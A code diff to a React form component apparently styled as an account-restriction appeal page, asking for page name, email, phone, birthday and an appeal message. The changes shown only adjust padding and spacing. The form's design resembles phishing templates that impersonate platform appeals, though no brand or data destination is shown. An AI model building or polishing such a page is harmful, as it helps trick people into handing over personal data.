@@ -319,7 +319,7 @@ const Home = () => {
                             <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
+                        <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
                             <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
@@ -328,7 +328,7 @@ const Home = () => {
                                     type='text' 
                                     name='pageName' 
                                     autoComplete='organization' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.pageName} 
                                     onChange={(e) => handleInputChange('pageName', e.target.value)} 
@@ -344,7 +344,7 @@ const Home = () => {
                                     type='email' 
                                     name='mail' 
                                     autoComplete='email' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.mail} 
                                     onChange={(e) => handleInputChange('mail', e.target.value)} 
@@ -352,19 +352,19 @@ const Home = () => {
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-2 text-sm font-medium text-gray-700'>{callingCode}</div>
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
                                     <input 
                                         type='tel' 
                                         name='phone' 
                                         inputMode='numeric' 
                                         pattern='[0-9]*' 
                                         autoComplete='off' 
-                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-2 focus:ring-0 focus:outline-none'
+                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none'
                                         style={{ fontSize: '16px' }}
                                         value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                         onChange={(e) => handleInputChange('phone', e.target.value)} 
@@ -373,7 +373,7 @@ const Home = () => {
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
@@ -382,7 +382,7 @@ const Home = () => {
                                 <input 
                                     type='date' 
                                     name='birthday' 
-                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.birthday} 
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
@@ -418,7 +418,7 @@ const Home = () => {
                                 <textarea 
                                     name='appeal'
                                     rows={4}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     style={{ fontSize: '16px' }}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
@@ -428,7 +428,7 @@ const Home = () => {
                             </div>
 
                             <button 
-                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 sm:mt-1'
+                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-1'
                                 onClick={handleSubmit}
                             >
                                 {translatedTexts.submit}
